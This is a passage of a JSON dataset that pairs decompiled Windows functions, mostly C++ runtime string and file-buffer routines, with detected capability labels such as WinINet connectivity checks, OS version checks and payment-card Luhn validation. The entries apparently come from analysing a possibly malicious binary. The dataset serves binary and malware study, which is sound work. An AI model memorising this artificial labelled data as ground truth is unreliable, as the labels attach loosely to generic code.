        "decompiled_code": "\nint32_t * __thiscall fcn.0046bde0(int32_t *param_1, int32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    int32_t *extraout_ECX;\n    uchar *puVar1;\n    int32_t in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t iStack28;\n    \n    if ((param_3 + 0x3ffffffc) - *(*param_1 + -0xc) < param_4) {\n        puVar1 = 0x5022a5;\n        fcn.0049ec30();\n        fcn.0046d3b0(in_stack_ffffffd8, in_stack_ffffffdc, iStack28);\n        if (iStack28 != 0) {\n            if (iStack28 == 1) {\n                *(in_stack_ffffffd8 + *extraout_ECX) = *puVar1;\n                return extraout_ECX;\n            }\n            sub.msvcrt.dll_memcpy(in_stack_ffffffd8 + *extraout_ECX, puVar1, iStack28);\n        }\n        return extraout_ECX;\n    }\n    fcn.0046d3b0(param_2, param_3, param_4);\n    if (param_4 != 0) {\n        if (param_4 == 1) {\n            *(param_2 + *param_1) = param_5;\n            return param_1;\n        }\n        sub.msvcrt.dll_memset(param_2 + *param_1, param_5, param_4);\n    }\n    return param_1;\n}\n",
        "token_count": 368
    },
    "0046be70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046be70(int32_t *param_1, int32_t param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    uchar *unaff_retaddr;\n    \n    fcn.0046d3b0(param_2, param_3, param_5);\n    if (param_5 != 0) {\n        if (param_5 == 1) {\n            *(param_2 + *param_1) = *unaff_retaddr;\n            return param_1;\n        }\n        sub.msvcrt.dll_memcpy(param_2 + *param_1, unaff_retaddr, param_5);\n    }\n    return param_1;\n}\n",
        "token_count": 161
    },
    "0046c080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046c080(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0046c0f0(*param_1 + param_3, param_1[1], param_2);\n    iVar2 = *param_1;\n    if (iVar2 != 0) {\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *(param_1 + 3);\n            iVar2 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1 + 3, iVar2);\n            iVar2 = *param_1;\n        }\n    }\n    *piVar1 = iVar2;\n    piVar1[2] = 0;\n    *(piVar1 + iVar2 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 231
    },
    "0046c6f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0046c6f0(int32_t *param_1, uchar *param_2, uint32_t param_3)\n\n{\n    uchar *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar auStack57 [5];\n    uint32_t uStack52;\n    int32_t iStack48;\n    uchar *puStack44;\n    int32_t *piStack40;\n    uchar *puStack36;\n    uint32_t uStack32;\n    int32_t *piStack16;\n    \n    puVar1 = *param_1;\n    iVar5 = *(puVar1 + -0xc);\n    if (0x3ffffffc < param_3) {\n        puStack44 = 0x5022ed;\n        iStack48 = 0x46c7d5;\n        fcn.0049ec30();\n        uStack52 = param_3;\n        iVar3 = *piStack40;\n        if (*extraout_ECX != iVar3) {\n            iStack48 = iVar5;\n            if (*(iVar3 + -4) < 0) {\n                iVar3 = fcn.0046c080(&stack0xffffffc7, 0);\n                iVar5 = *extraout_ECX;\n            }\n            else {\n                if (*0x4f59f4 == 0) {\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                iVar5 = *extraout_ECX;\n            }\n            if (*0x4f59f4 == 0) {\n                iVar4 = *(iVar5 + -4);\n                *(iVar5 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = iVar5 + -4;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 < 1) {\n                fcn.004a34c0(iVar5 + -0xc);\n                *extraout_ECX = iVar3;\n            }\n            else {\n                *extraout_ECX = iVar3;\n            }\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    if ((param_2 < puVar1) || (puVar1 + iVar5 < param_2)) {\ncode_r0x0046c713:\n        uStack32 = param_3;\n        puStack36 = param_2;\n        puStack44 = NULL;\n        iStack48 = 0x46c72b;\n        piStack40 = iVar5;\n        piVar2 = fcn.0046be70();\n        return piVar2;\n    }\n    puStack44 = *param_1;\n    if (0 < *(puVar1 + -4)) {\n        iVar5 = *(puStack44 + -0xc);\n        goto code_r0x0046c713;\n    }\n    piStack16 = param_1;\n    if (param_2 - puStack44 < param_3) {\n        if (param_2 == puStack44) goto code_r0x0046c780;\n        if (param_3 != 1) {\n            puStack36 = param_3;\n            piStack40 = param_2;\n            iStack48 = 0x46c77a;\n            sub.msvcrt.dll_memmove();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n            goto code_r0x0046c780;\n        }\n    }\n    else if (param_3 != 1) {\n        if (param_3 != 0) {\n            puStack36 = param_3;\n            piStack40 = param_2;\n            iStack48 = 0x46c7af;\n            sub.msvcrt.dll_memcpy();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n        }\n        goto code_r0x0046c780;\n    }\n    *puStack44 = *param_2;\n    puStack44 = *param_1;\ncode_r0x0046c780:\n    *(puStack44 + -4) = 0;\n    *(puStack44 + -0xc) = param_3;\n    puStack44[param_3] = 0;\n    return param_1;\n}\n",
        "token_count": 1000
    },
    "0046cf90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t * __cdecl fcn.0046cf90(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *in_ECX;\n    uchar *puVar8;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint32_t in_stack_ffffffc0;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    uVar1 = *in_ECX;\n    piVar2 = *(uVar1 - 0xc);\n    if (arg_8h <= piVar2) {\n        if (piVar2 - arg_8h <= arg_ch) {\n            arg_ch = piVar2 - arg_8h;\n        }\n        if (arg_14h <= (arg_ch - piVar2) + 0x3ffffffc) {\n            if (((arg_10h < uVar1) || (piVar2 + uVar1 < arg_10h)) || (0 < *(uVar1 - 4))) {\n                in_ECX = fcn.0046be70(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n            else {\n                uVar1 = *in_ECX;\n                if (uVar1 + arg_8h < arg_10h + arg_14h) {\n                    if (arg_10h < arg_8h + uVar1 + arg_ch) {\n                        iVar4 = fcn.0046bb70(arg_10h, arg_10h + arg_14h, &var_19h, in_stack_ffffffc0 & 0xffffff00);\n                        puVar5 = fcn.0046be70(arg_8h, arg_ch, iVar4, arg_14h);\n                        if (*0x4f59f4 == 0) {\n                            iVar6 = *(iVar4 + -4);\n                            *(iVar4 + -4) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            piVar2 = iVar4 + -4;\n                            iVar6 = *piVar2;\n                            *piVar2 = *piVar2 + -1;\n                        }\n                        if (0 < iVar6) {\n                            return puVar5;\n                        }\n                        fcn.004a34c0(iVar4 + -0xc);\n                        return puVar5;\n                    }\n                    var_2ch = ((arg_10h - uVar1) + arg_14h) - arg_ch;\n                }\n                else {\n                    var_2ch = arg_10h - uVar1;\n                }\n                fcn.0046d3b0(arg_8h, arg_ch, arg_14h);\n                puVar3 = var_2ch + *in_ECX;\n                puVar8 = arg_8h + *in_ECX;\n                if (arg_14h == 1) {\n                    *puVar8 = *puVar3;\n                }\n                else if (arg_14h != 0) {\n                    sub.msvcrt.dll_memcpy(puVar8, puVar3, arg_14h);\n                }\n            }\n            return in_ECX;\n        }\n        fcn.0049ec30(0x5022d7);\n    }\n    arg_ch_00 = 0x5022d7;\n    uVar7 = fcn.0049f220(0x5021d4, 0x5022d7);\n    arg_8h_00 = &var_19h;\n    fcn.0046bf80();\n    fcn.0041b360(uVar7);\n    puVar5 = fcn.0046cf90(arg_8h_00, arg_ch_00, *arg_8h, *(*arg_8h + -0xc));\n    return puVar5;\n}\n",
        "token_count": 923
    },
    "0046d3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0046d3b0(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar auStack29 [13];\n    \n    iVar9 = *param_1;\n    uVar8 = *(iVar9 + -8);\n    uVar6 = (param_4 - param_3) + *(iVar9 + -0xc);\n    iVar5 = param_2 + param_3;\n    iVar7 = *(iVar9 + -0xc) - iVar5;\n    if (uVar6 <= uVar8) {\n        if (*(iVar9 + -4) < 1) {\n            iVar9 = *param_1;\n            if ((iVar7 != 0) && (param_4 != param_3)) {\n                puVar4 = iVar9 + param_4 + param_2;\n                if (iVar7 == 1) {\n                    *puVar4 = *(iVar5 + iVar9);\n                    iVar9 = *param_1;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar4, iVar5 + iVar9, iVar7);\n                    iVar9 = *param_1;\n                }\n            }\n            goto code_r0x0046d471;\n        }\n        uVar8 = *(*param_1 + -8);\n    }\n    iVar2 = fcn.0046c0f0(uVar6, uVar8, auStack29);\n    if (param_2 != 0) {\n        if (param_2 == 1) {\n            *(iVar2 + 0xc) = **param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar2 + 0xc, *param_1, param_2);\n        }\n    }\n    iVar9 = iVar2 + 0xc;\n    iVar3 = *param_1;\n    if (iVar7 != 0) {\n        puVar4 = iVar2 + param_2 + 0xc + param_4;\n        if (iVar7 == 1) {\n            *puVar4 = *(iVar3 + iVar5);\n            iVar3 = *param_1;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar4, iVar3 + iVar5, iVar7);\n            iVar3 = *param_1;\n        }\n    }\n    if (*0x4f59f4 == 0) {\n        iVar5 = *(iVar3 + -4);\n        *(iVar3 + -4) = iVar5 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iVar3 + -4;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar5 < 1) {\n        fcn.004a34c0(iVar3 + -0xc);\n    }\n    *param_1 = iVar9;\ncode_r0x0046d471:\n    *(iVar9 + -4) = 0;\n    *(iVar9 + -0xc) = uVar6;\n    *(iVar9 + uVar6) = 0;\n    return;\n}\n",
        "token_count": 754
    },
    "0046dfb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046dfb0(int32_t param_1, uchar *param_2, char param_3)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    \n    uVar2 = *(param_1 + 0xc);\n    puVar4 = param_2 + 1;\n    *param_2 = 0x25;\n    if ((uVar2 & 0x800) != 0) {\n        param_2[1] = 0x2b;\n        puVar4 = param_2 + 2;\n    }\n    if ((uVar2 & 0x400) != 0) {\n        *puVar4 = 0x23;\n        puVar4 = puVar4 + 1;\n    }\n    uVar5 = uVar2 & 0x104;\n    if (uVar5 == 0x104) {\n        puVar3 = puVar4;\n        if (param_3 == '\\0') goto code_r0x0046e078;\ncode_r0x0046e048:\n        *puVar3 = param_3;\n        puVar1 = puVar3 + 1;\n        puVar4 = puVar3 + 1;\n    }\n    else {\n        *puVar4 = 0x2a2e;\n        puVar3 = puVar4 + 1;\n        if (param_3 != '\\0') goto code_r0x0046e048;\n        puVar1 = puVar4 + 3;\n        puVar4 = puVar4 + 1;\n    }\n    if (uVar5 == 4) {\n        *puVar4 = 0x66;\n        *puVar1 = 0;\n        return;\n    }\n    if (uVar5 == 0x100) {\n        *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x45;\n        *puVar1 = 0;\n        return;\n    }\n    if (uVar5 != 0x104) {\n        *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x47;\n        *puVar1 = 0;\n        return;\n    }\ncode_r0x0046e078:\n    *puVar4 = (-((uVar2 & 0x4000) == 0) & 0x20U) + 0x41;\n    *(puVar4 + 1) = 0;\n    return;\n}\n",
        "token_count": 588
    },
    "00470c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00470c20(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 == 0) {\n        return NULL;\n    }\n    if (*(param_1 + 1) != '\\0') {\n        iVar1 = sub.msvcrt.dll_fclose(*param_1);\n        *param_1 = 0;\n        if (iVar1 != 0) {\n            param_1 = NULL;\n        }\n        return param_1;\n    }\n    *param_1 = 0;\n    return param_1;\n}\n",
        "token_count": 131
    },
    "00476c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00476c70(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint *puVar5;\n    int32_t iStack36;\n    uint auStack32 [4];\n    \n    if (*(param_1 + 0x58) == NULL) goto code_r0x00476dcf;\n    cVar1 = (**(**(param_1 + 0x58) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(param_1 + 0x58) + 0x20))();\n        fcn.00418950();\n        puVar5 = auStack32;\n        uVar2 = (**(**(param_1 + 0x58) + 8))\n                          (param_1 + 0x38, param_2, param_2 + param_3, puVar5, auStack32, extraout_EDX + auStack32, \n                           &iStack36);\n        if (uVar2 < 2) {\n            param_3 = iStack36 - auStack32;\n            iVar4 = iStack36;\n            uVar3 = fcn.00470cc0(auStack32, param_3);\n            if ((param_3 != uVar3) || ((uVar2 & 1) == 0)) goto code_r0x00476d1e;\n            iVar4 = (**(**(param_1 + 0x58) + 8))\n                              (puVar5, auStack32[0], *(param_1 + 0x14), auStack32, auStack32, iVar4, &iStack36);\n            if (iVar4 != 2) {\n                uVar3 = iStack36 - auStack32;\n                uVar2 = fcn.00470cc0(auStack32, uVar3);\n                return uVar2 & 0xffffff00 | uVar2 == uVar3;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x00476d09;\n        fcn.0049e910(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00476dcf:\n        fcn.0049e780();\n        if (*(extraout_ECX + 0x48) != '\\0') {\n            if (*(extraout_ECX + 0x40) != 0) {\n                fcn.004a34b0(*(extraout_ECX + 0x40));\n            }\n            *(extraout_ECX + 0x40) = 0;\n            *(extraout_ECX + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX + 0x5c);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004a34b0(uVar2);\n        }\n        *(extraout_ECX + 0x5c) = 0;\n        *(extraout_ECX + 0x60) = 0;\n        *(extraout_ECX + 100) = 0;\n        *(extraout_ECX + 0x68) = 0;\n        return uVar2;\n    }\ncode_r0x00476d09:\n    uVar3 = fcn.00470cc0(param_2, param_3);\ncode_r0x00476d1e:\n    return uVar3 & 0xffffff00 | uVar3 == param_3;\n}\n",
        "token_count": 813
    },
    "00476de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476de0(int32_t param_1)\n\n{\n    if (*(param_1 + 0x48) != '\\0') {\n        if (*(param_1 + 0x40) != 0) {\n            fcn.004a34b0(*(param_1 + 0x40));\n        }\n        *(param_1 + 0x40) = 0;\n        *(param_1 + 0x48) = 0;\n    }\n    if (*(param_1 + 0x5c) != 0) {\n        fcn.004a34b0(*(param_1 + 0x5c));\n    }\n    *(param_1 + 0x5c) = 0;\n    *(param_1 + 0x60) = 0;\n    *(param_1 + 100) = 0;\n    *(param_1 + 0x68) = 0;\n    return;\n}\n",
        "token_count": 209
    },
    "00476e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476e40(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if ((*(param_1 + 0x48) == '\\0') && (*(param_1 + 0x40) == 0)) {\n        uVar1 = fcn.004a34e0(*(param_1 + 0x44));\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = uVar1;\n        return;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00476e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00476e70(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    cVar1 = fcn.0042ea40();\n    if (cVar1 == '\\0') {\n        fcn.00470ba0(param_2, param_3, 0x1b4);\n        cVar1 = fcn.0042ea40();\n        if (cVar1 != '\\0') {\n            iVar2 = param_1[0x10];\n            if ((*(param_1 + 0x12) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.004a34e0(param_1[0x11]);\n                *(param_1 + 0x12) = 1;\n                param_1[0x10] = iVar2;\n            }\n            param_1[1] = iVar2;\n            param_1[2] = iVar2;\n            param_1[3] = iVar2;\n            param_1[0xc] = param_3;\n            *(param_1 + 0x49) = 0;\n            param_1[5] = 0;\n            param_1[4] = 0;\n            param_1[6] = 0;\n            param_1[0xe] = param_1[0xd];\n            param_1[0xf] = param_1[0xd];\n            if ((param_3 & 2) != 0) {\n                uVar3 = 2;\n                (**(*param_1 + 0x10))(param_1, 0, 0);\n                if ((param_3 & uVar3) == 0xffffffff) {\n                    fcn.00477160();\n                    return NULL;\n                }\n            }\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 436
    },
    "00478c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00478c00(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint *puVar5;\n    int32_t iStack36;\n    uint auStack32 [4];\n    \n    if (*(param_1 + 0x5c) == NULL) goto code_r0x00478d5f;\n    cVar1 = (**(**(param_1 + 0x5c) + 0x18))();\n    if (cVar1 == '\\0') {\n        (**(**(param_1 + 0x5c) + 0x20))();\n        fcn.00418950();\n        puVar5 = auStack32;\n        uVar2 = (**(**(param_1 + 0x5c) + 8))\n                          (param_1 + 0x38, param_2, param_2 + param_3 * 2, puVar5, auStack32, extraout_EDX + auStack32, \n                           &iStack36);\n        if (uVar2 < 2) {\n            param_3 = iStack36 - auStack32;\n            iVar4 = iStack36;\n            uVar3 = fcn.00470cc0(auStack32, param_3);\n            if ((param_3 != uVar3) || ((uVar2 & 1) == 0)) goto code_r0x00478cac;\n            iVar4 = (**(**(param_1 + 0x5c) + 8))\n                              (puVar5, auStack32[0], *(param_1 + 0x14), auStack32, auStack32, iVar4, &iStack36);\n            if (iVar4 != 2) {\n                uVar3 = iStack36 - auStack32;\n                uVar2 = fcn.00470cc0(auStack32, uVar3);\n                return uVar2 & 0xffffff00 | uVar2 == uVar3;\n            }\n        }\n        else if (uVar2 == 3) goto code_r0x00478c97;\n        fcn.0049e910(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00478d5f:\n        fcn.0049e780();\n        if (*(extraout_ECX + 0x48) != '\\0') {\n            if (*(extraout_ECX + 0x40) != 0) {\n                fcn.004a34b0(*(extraout_ECX + 0x40));\n            }\n            *(extraout_ECX + 0x40) = 0;\n            *(extraout_ECX + 0x48) = 0;\n        }\n        uVar2 = *(extraout_ECX + 0x60);\n        if (uVar2 != 0) {\n            uVar2 = fcn.004a34b0(uVar2);\n        }\n        *(extraout_ECX + 0x60) = 0;\n        *(extraout_ECX + 100) = 0;\n        *(extraout_ECX + 0x68) = 0;\n        *(extraout_ECX + 0x6c) = 0;\n        return uVar2;\n    }\ncode_r0x00478c97:\n    uVar3 = fcn.00470cc0(param_2, param_3);\ncode_r0x00478cac:\n    return uVar3 & 0xffffff00 | uVar3 == param_3;\n}\n",
        "token_count": 818
    },
    "00478d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478d70(int32_t param_1)\n\n{\n    if (*(param_1 + 0x48) != '\\0') {\n        if (*(param_1 + 0x40) != 0) {\n            fcn.004a34b0(*(param_1 + 0x40));\n        }\n        *(param_1 + 0x40) = 0;\n        *(param_1 + 0x48) = 0;\n    }\n    if (*(param_1 + 0x60) != 0) {\n        fcn.004a34b0(*(param_1 + 0x60));\n    }\n    *(param_1 + 0x60) = 0;\n    *(param_1 + 100) = 0;\n    *(param_1 + 0x68) = 0;\n    *(param_1 + 0x6c) = 0;\n    return;\n}\n",
        "token_count": 207
    },
    "00478dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00478dd0(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    char unaff_DI;\n    ulong uVar5;\n    int32_t in_stack_00000024;\n    \n    if ((*(param_1 + 0x48) != '\\0') || (in_EAX = *(param_1 + 0x40),  in_EAX != 0)) {\n        return in_EAX;\n    }\n    if (*(param_1 + 0x44) < 0x3fffffff) {\n        iVar1 = fcn.004a34e0(*(param_1 + 0x44) * 2);\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = iVar1;\n        return iVar1;\n    }\n    fcn.004a3c30();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    fcn.004a3910();\n    fcn.0041b360();\n    uVar5 = fcn.004a3c30();\n    if (uVar5 >> 0x20 != 1) {\n        fcn.0041b360(uVar5);\n    }\n    fcn.004a36d0();\n    fcn.004a3840();\n    uVar2 = *(unaff_EBX + 0x14) | 1;\n    *(unaff_EBX + 0x14) = uVar2;\n    if ((*(unaff_EBX + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(unaff_EBX + 0x1c) = 0;\n        }\n        else {\n            *(unaff_EBX + 0x20) = 0;\n        }\n        return unaff_EBX + 0x1c;\n    }\n    iVar3 = fcn.0049e910(\"ios_base::_M_grow_words allocation failed\");\n    iVar1 = *(unaff_EBX + 0x68);\n    uVar4 = extraout_ECX;\n    if ((iVar1 != unaff_EBP) && (iVar1 != 0)) {\n        fcn.004a34b0(iVar1);\n    }\n    *(unaff_EBX + 0x68) = iVar3;\n    *(unaff_EBX + 100) = uVar4;\n    return iVar3 + in_stack_00000024 * 8;\n}\n",
        "token_count": 749
    },
    "00478e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00478e20(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    cVar1 = fcn.0042ea40();\n    if (cVar1 == '\\0') {\n        fcn.00470ba0(param_2, param_3, 0x1b4);\n        cVar1 = fcn.0042ea40();\n        if (cVar1 != '\\0') {\n            iVar2 = param_1[0x10];\n            if ((*(param_1 + 0x12) == '\\0') && (iVar2 == 0)) {\n                fcn.00478df0();\n                iVar2 = param_1[0x10];\n            }\n            param_1[1] = iVar2;\n            param_1[2] = iVar2;\n            param_1[3] = iVar2;\n            param_1[0xc] = param_3;\n            *(param_1 + 0x49) = 0;\n            param_1[5] = 0;\n            param_1[4] = 0;\n            param_1[6] = 0;\n            param_1[0xe] = param_1[0xd];\n            param_1[0xf] = param_1[0xd];\n            if ((param_3 & 2) != 0) {\n                uVar3 = 2;\n                (**(*param_1 + 0x10))(param_1, 0, 0);\n                if ((param_3 & uVar3) == 0xffffffff) {\n                    fcn.00479100();\n                    return NULL;\n                }\n            }\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 409
    },
    "0047de50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047de50(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    uint var_19h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    in_ECX[2] = 0;\n    fcn.0047e5b0(arg_8h, 1);\n    if ((var_19h != '\\0') && ((*(arg_8h + *(*arg_8h + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, 0, 0, 1, 8);\n        *in_ECX = stack0xffffffe4;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "0048da50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
